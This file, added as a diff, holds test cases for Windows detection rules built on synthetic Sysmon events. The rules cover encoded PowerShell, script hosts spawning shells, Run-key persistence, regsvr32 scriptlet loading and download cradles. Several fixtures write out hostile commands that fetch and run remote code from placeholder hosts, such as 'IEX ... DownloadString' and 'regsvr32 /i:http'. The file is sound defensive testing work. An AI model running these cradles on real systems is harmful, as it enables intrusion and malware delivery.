@@ -1,0 +1,591 @@
+[
+  {
+    "rule_id": "1131fb39-a497-4a09-b051-4e4c89066f5f",
+    "rule_name": "PowerShell Encoded Command Execution",
+    "cases": [
+      {
+        "name": "canonical -EncodedCommand",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAA=="
+            }
+          }
+        }
+      },
+      {
+        "name": "abbreviated lowercase -enc",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -nop -enc VwByAGkAdABlAA=="
+            }
+          }
+        }
+      },
+      {
+        "name": "case evasion -EnCoDeDcOmMaNd",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -EnCoDeDcOmMaNd VwByAGkAdABlAA=="
+            }
+          }
+        }
+      },
+      {
+        "name": "pwsh.exe instead of powershell.exe",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+              "CommandLine": "pwsh.exe -NoLogo -EncodedCommand VwByAGkAdABlAA=="
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: -ExecutionPolicy must not match the -e prefix",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\deploy.ps1"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: ordinary command",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -Command Get-Process"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: encoded command from a non-PowerShell image",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\cmd.exe",
+              "CommandLine": "cmd.exe /c app.exe -EncodedCommand VwByAGkAdABlAA=="
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: wrong event id",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "3"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -EncodedCommand VwByAGkAdABlAA=="
+            }
+          }
+        }
+      }
+    ]
+  },
+  {
+    "rule_id": "a41ef4b6-efa6-42c0-80d6-3d4ccd1b2aa9",
+    "rule_name": "Script Host Spawning a Command Shell",
+    "cases": [
+      {
+        "name": "wscript spawns powershell",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -Command Get-Date",
+              "ParentImage": "C:\\Windows\\System32\\wscript.exe"
+            }
+          }
+        }
+      },
+      {
+        "name": "cscript spawns cmd",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\cmd.exe",
+              "CommandLine": "cmd.exe /c dir",
+              "ParentImage": "C:\\Windows\\System32\\cscript.exe"
+            }
+          }
+        }
+      },
+      {
+        "name": "mshta spawns powershell (benign-looking child command line)",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -Command Write-Output ok",
+              "ParentImage": "C:\\Windows\\System32\\mshta.exe"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: explorer spawns powershell is normal",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -Command Get-Date",
+              "ParentImage": "C:\\Windows\\explorer.exe"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: wscript spawns a non-shell child",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\notepad.exe",
+              "CommandLine": "notepad.exe a.txt",
+              "ParentImage": "C:\\Windows\\System32\\wscript.exe"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: no parent recorded",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -Command Get-Date"
+            }
+          }
+        }
+      }
+    ]
+  },
+  {
+    "rule_id": "0630c267-9ba0-40b2-95d9-670996d404c8",
+    "rule_name": "Registry Run Key Persistence",
+    "cases": [
+      {
+        "name": "HKCU Run value set",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "13"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "TargetObject": "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+              "Details": "cmd.exe /c echo hi"
+            }
+          }
+        }
+      },
+      {
+        "name": "HKLM RunOnce value set",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "13"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Setup",
+              "Details": "cmd.exe /c echo hi"
+            }
+          }
+        }
+      },
+      {
+        "name": "RunServices value set",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "13"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\\Svc",
+              "Details": "cmd.exe /c echo hi"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: unrelated registry path",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "13"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden",
+              "Details": "cmd.exe /c echo hi"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: RunNotifications is not an autorun key",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "13"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunNotifications\\Foo",
+              "Details": "cmd.exe /c echo hi"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: process creation event, not a registry set",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\cmd.exe",
+              "CommandLine": "cmd.exe /c reg add HKCU\\...\\CurrentVersion\\Run\\X",
+              "ParentImage": "C:\\Windows\\explorer.exe"
+            }
+          }
+        }
+      }
+    ]
+  },
+  {
+    "rule_id": "6b5da61b-8454-449f-b33c-99f2335025c9",
+    "rule_name": "Regsvr32 Remote Scriptlet Execution",
+    "cases": [
+      {
+        "name": "squiblydoo with http scriptlet",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "regsvr32.exe /s /n /u /i:http://10.0.0.5/a.sct scrobj.dll",
+              "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      },
+      {
+        "name": "scrobj.dll reference alone",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "regsvr32.exe /s /i:file.sct scrobj.dll",
+              "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      },
+      {
+        "name": "UNC scriptlet path",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "regsvr32.exe /s /i:\\\\10.0.0.5\\share\\a.sct payload.dll",
+              "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: ordinary DLL registration",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "regsvr32.exe /s C:\\Program Files\\App\\component.dll",
+              "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: scrobj.dll referenced by a different binary",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\cmd.exe",
+              "CommandLine": "cmd.exe /c copy scrobj.dll C:\\temp",
+              "ParentImage": "C:\\Windows\\explorer.exe"
+            }
+          }
+        }
+      }
+    ]
+  },
+  {
+    "rule_id": "8c1d2f4a-5b6e-47c8-9a03-2e7f81d4b6c5",
+    "rule_name": "PowerShell Encoded Download Cradle",
+    "cases": [
+      {
+        "name": "classic DownloadString cradle",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -enc <redacted>"
+            }
+          },
+          "aegis": {
+            "powershell": {
+              "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')",
+              "decode_status": "decoded"
+            }
+          }
+        }
+      },
+      {
+        "name": "Invoke-WebRequest staging",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -enc <redacted>"
+            }
+          },
+          "aegis": {
+            "powershell": {
+              "decoded_command": "Invoke-WebRequest -Uri http://10.0.0.5/x -OutFile $env:TEMP\\x.exe",
+              "decode_status": "decoded"
+            }
+          }
+        }
+      },
+      {
+        "name": "in-memory assembly load",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -enc <redacted>"
+            }
+          },
+          "aegis": {
+            "powershell": {
+              "decoded_command": "[Reflection.Assembly]::Load([Convert]::FromBase64String($payload))",
+              "decode_status": "decoded"
+            }
+          }
+        }
+      },
+      {
+        "name": "mixed case is normalised by the pipeline",
+        "should_match": true,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -enc <redacted>"
+            }
+          },
+          "aegis": {
+            "powershell": {
+              "decoded_command": "iex (New-Object Net.WebClient).DownloadSTRING('http://a/b')",
+              "decode_status": "decoded"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: the benign lab marker must not alert",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -enc <redacted>"
+            }
+          },
+          "aegis": {
+            "powershell": {
+              "decoded_command": "Write-Output 'AEGIS-20260802T053038839Z-984f587b'",
+              "decode_status": "decoded"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: routine administration",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -enc <redacted>"
+            }
+          },
+          "aegis": {
+            "powershell": {
+              "decoded_command": "$ProgressPreference='SilentlyContinue'; Get-Service | Out-String",
+              "decode_status": "decoded"
+            }
+          }
+        }
+      },
+      {
+        "name": "negative: no decoded payload present",
+        "should_match": false,
+        "document": {
+          "event": {
+            "code": "1"
+          },
+          "winlog": {
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "event_data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -Command Get-Date"
+            }
+          }
+        }
+      }
+    ]
+  }
+]
